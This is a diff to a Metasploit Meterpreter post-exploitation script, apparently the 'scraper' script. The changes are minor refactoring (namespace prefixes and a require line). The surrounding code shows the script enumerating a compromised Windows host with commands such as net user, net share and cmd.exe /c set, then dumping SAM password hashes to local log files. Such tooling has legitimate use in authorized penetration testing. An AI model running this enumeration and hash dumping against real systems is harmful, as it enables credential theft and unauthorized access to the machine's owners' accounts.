@@ -8,6 +8,8 @@
 # hdm[at]metasploit.com
 #
 
+require 'fileutils'
+
 # Some of this script was developed in conjunction with _MAX_ (max[at]remote-exploit.org)
 # The complete version will be released in the future as 'autometer'
 
@@ -33,6 +35,8 @@ def m_exec(session, cmd)
 end
 
 
+
+
 # The 'client' object holds the Meterpreter session
 # Aliasing here for plugin compatibility
 session = client
@@ -43,10 +47,10 @@ host,port = session.tunnel_peer.split(':')
 print_status("New session on #{host}:#{port}...")
 
 # Create a directory for the logs
-logs = File.join(Msf::Config.config_directory, 'logs', 'scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) )
+logs = ::File.join(Msf::Config.config_directory, 'logs', 'scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) )
 
 # Create the log directory
-FileUtils.mkdir_p(logs)
+::FileUtils.mkdir_p(logs)
 
 
 begin
@@ -55,7 +59,7 @@ begin
 
 	print_status("Gathering basic system information...")
 
-	File.open(File.join(logs, "network.txt"), "w") do |fd|
+	::File.open(File.join(logs, "network.txt"), "w") do |fd|
 		fd.puts("=" * 70)
 		session.net.config.each_route do |route|
 			fd.puts("Local subnet: #{route.subnet}/#{route.netmask}")
@@ -69,36 +73,36 @@ begin
 	end
 
 	info = session.sys.config.sysinfo()
-	File.open(File.join(logs, "system.txt"), "w") do |fd|
+	::File.open(File.join(logs, "system.txt"), "w") do |fd|
 		fd.puts("Computer: #{info['Computer']}")
 		fd.puts("OS: #{info['OS']}")
 	end
 
-	File.open(File.join(logs, "env.txt"), "w") do |fd|
+	::File.open(File.join(logs, "env.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "cmd.exe /c set"))
 	end
 
-	File.open(File.join(logs, "users.txt"), "w") do |fd|
+	::File.open(File.join(logs, "users.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "net user"))
 	end
 
-	File.open(File.join(logs, "shares.txt"), "w") do |fd|
+	::File.open(File.join(logs, "shares.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "net share"))
 	end
 
-	File.open(File.join(logs, "services.txt"), "w") do |fd|
+	::File.open(File.join(logs, "services.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "net start"))
 	end
 
-	File.open(File.join(logs, "nethood.txt"), "w") do |fd|
+	::File.open(File.join(logs, "nethood.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "net view"))
 	end
 
-	File.open(File.join(logs, "localgroup.txt"), "w") do |fd|
+	::File.open(File.join(logs, "localgroup.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "net localgroup"))
 	end
 
-	File.open(File.join(logs, "group.txt"), "w") do |fd|
+	::File.open(File.join(logs, "group.txt"), "w") do |fd|
 		fd.puts(m_exec(session, "net group"))
 	end
 
@@ -106,7 +110,7 @@ begin
 		session.core.use("priv")
 		hashes = session.priv.sam_hashes
 		print_status("Dumping password hashes...")
-		File.open(File.join(logs, "hashes.txt"), "w") do |fd|
+		::File.open(File.join(logs, "hashes.txt"), "w") do |fd|
 			hashes.each do |user|
 				fd.puts(user.to_s)
 			end
